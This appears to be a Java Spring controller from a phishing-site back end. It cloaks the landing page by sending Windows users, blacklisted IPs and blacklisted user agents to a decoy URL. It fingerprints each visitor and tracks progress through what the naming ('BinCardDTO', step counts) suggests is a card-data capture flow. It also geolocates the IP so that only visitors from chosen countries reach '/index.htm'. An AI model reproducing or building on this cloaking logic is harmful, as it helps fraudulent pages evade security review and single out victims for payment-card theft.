package com.gzlh.controller;

import cn.hutool.core.util.StrUtil;
import cn.hutool.crypto.digest.DigestUtil;
import cn.hutool.http.HttpUtil;
import cn.hutool.json.JSONUtil;
import cn.hutool.log.StaticLog;
import com.gzlh.cache.CacheManager;
import com.gzlh.entity.BinCardDTO;
import com.gzlh.task.WhiteIpDTO;
import com.gzlh.utils.AjaxJson;
import com.gzlh.utils.IpUtil;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.servlet.view.RedirectView;

import javax.servlet.http.HttpServletRequest;
import java.util.List;

@Controller
public class IndexController {
    @Value("${main.server}")
    private String mainServerUrl;

    @RequestMapping("")
    public RedirectView index(HttpServletRequest request) {
        WhiteIpDTO dto = CacheManager.getWhiteIpDTO();
        String ip = IpUtil.getRealIp(request);
        String ua = request.getHeader("user-agent");
        if (StrUtil.contains(ua.toLowerCase(), "window") && dto.getLimitPhone() == 1) {
            return new RedirectView(dto.getUrl());
        }
        List<String> ipList = StrUtil.splitTrim(dto.getBlackIpStr(), ",");
        if (ipList.contains(ip)){
            return new RedirectView(dto.getUrl());
        }
        List<String> uaList = StrUtil.splitTrim(dto.getBlackUaStr(), ",");
        if (uaList.contains(ua)){
            return new RedirectView(dto.getUrl());
        }
        String language = request.getHeader("accept-language");
        String fingerprint = DigestUtil.md5Hex(ip + ua + language);
        String reqUrl = mainServerUrl + "/card/getInfo?fingerprint=" + fingerprint;
        String res = HttpUtil.get(reqUrl);
        AjaxJson json = JSONUtil.toBean(res, AjaxJson.class);
        if (json.getCode() == 20000) {
            BinCardDTO binCardDTO = JSONUtil.toBean(JSONUtil.toJsonStr(json.getObjData()), BinCardDTO.class);
            if (binCardDTO.getStepTotal() < binCardDTO.getCurrentStep()) {
                return new RedirectView(dto.getUrl());
            }
        }
//        String ip = "183.128.125.6";
        String url = "http://ip.bczs.net/" + ip;
        String resp = HttpUtil.get(url);
        resp = StrUtil.subAfter(resp, "<div class=\"well\">", true);
        resp = StrUtil.subBefore(resp, "<div id=\"range\">", true);

        List<String> countryList = dto.getCountryList();

        for (String s : countryList) {
            if (resp.contains(s)){
                return new RedirectView("/index.htm");
            }
        }

        if (countryList.isEmpty() || StrUtil.isEmpty(dto.getUrl())) {
            return new RedirectView("/index.htm");
        }

        return new RedirectView(dto.getUrl());
    }


}
